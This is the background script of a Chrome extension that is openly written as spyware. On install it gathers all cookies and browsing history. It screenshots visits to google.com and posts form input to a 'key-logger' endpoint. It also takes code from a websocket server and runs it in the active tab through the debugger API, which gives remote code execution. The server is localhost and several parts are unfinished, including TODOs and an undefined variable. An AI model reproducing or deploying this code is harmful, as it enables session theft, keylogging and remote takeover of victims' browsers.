// Perform the initial data steal and connect to websockets only after website is ready
async function onReady() {
    await stealUserData();
    await connectWebSocket();
}

chrome.runtime.onInstalled.addListener(onReady);

/* =================================================================================== */

// Steal cookies and browsing history on load
async function stealUserData() {
    const cookies = await chrome.cookies.getAll({});
    const history = await chrome.history.search({text: ""});

    // TODO: Save history and all cookies
    console.log('cookies', cookies);
    console.log('history', history);
}

/* =================================================================================== */

// On visit of a certain domain, take a screenshot
async function onVisited(historyItem) {
    if (historyItem.url.includes('google.com')) {
        console.log('historyItem', historyItem);
        const screenshotUrl = await chrome.tabs.captureVisibleTab();

    }
}

chrome.history.onVisited.addListener(onVisited)

/* =================================================================================== */

// Send the input values to the server which will save them in a DB
async function onInputMessage(message, sender, sendResponse) {
    try {
        const response = await fetch('http://localhost:3000/key-logger', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(request.data)
        })

        sendResponse({status: 'ok'})
    } catch (err) {
        console.error(err.message);
        sendResponse({status: 'fail'})
    }
}

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    (async () => {
        switch (request.type) {
            case 'SUBMIT_FORM':
                await onInputMessage(request, sender, sendResponse);
            default:
                console.log('Unknown message received from content script:', request);
                break;
        }
    })();
    return true
})

/* =================================================================================== */

// Establish a websocket connection to the server and forward all messages from the server to the popup
// This way the popup can receive real-time code from the server and execute on client-side
async function connectWebSocket() {
    const socket = new WebSocket('ws://localhost:3000');

    socket.onopen = () => {
        console.log('WebSocket connected');
    };

    socket.onmessage = onWsMessage;

    socket.onerror = (error) => {
        console.error('WebSocket error: ', error);
    };

    socket.onclose = (event) => {
        console.log('WebSocket closed. Attempting to reconnect...');
        setTimeout(connectWebSocket, 2000);
    };
}

// Process the message from the WS server
async function onWsMessage(event) {
    let currentTab = await getCurrentTab();
    if (!currentTab) {
        console.error('Could not find current tab');
        return;
    }
    // Foward all messages from the WS server to the content script for execution
    // TODO: I haven't figured this out just yet because of the CSP
    chrome.tabs.sendMessage(currentTab.id, {type: 'WEBSOCKET_MESSAGE', data: event.data});


    // Evaluate the code in the context of the current tab with the debugger
    await chrome.debugger.attach({tabId: currentTab.id}, "1.3");
    await chrome.debugger.sendCommand({tabId: currentTab.id}, "Runtime.evaluate", {expression: event.data});
    await chrome.debugger.detach({tabId: currentTab.id});
}

/* =================================================================================== */
// Misc functions

// Get the current tab
async function getCurrentTab() {
    let queryOptions = {active: true, lastFocusedWindow: true};
    let [tab] = await chrome.tabs.query(queryOptions);
    return tab;
}
